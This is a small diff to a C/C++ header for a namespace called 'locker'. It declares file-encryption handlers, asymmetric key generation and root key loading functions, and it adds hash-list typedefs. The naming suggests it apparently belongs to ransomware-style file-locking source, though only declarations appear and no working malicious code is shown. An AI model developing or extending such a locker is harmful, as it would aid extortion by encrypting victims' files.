@@ -30,9 +30,13 @@ namespace locker
 	
 	BOOL HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs, SLIST<HLIST>* HashList);
 	BOOL HandlerASymmetricGenKey();
-	BOOL VerifyContent(SLIST<locker::HLIST>* list);
+
+	VOID LoadPublicRootKey(BYTE** g_PublicKeyRoot, DWORD* size);
+	VOID LoadPrivateRootKey(BYTE** g_PrivateKeyRoot, DWORD* size);
 }
 
+typedef locker::HLIST HASH_LIST;
+typedef locker::HLIST* PHASH_LIST;
 
 
 #endif
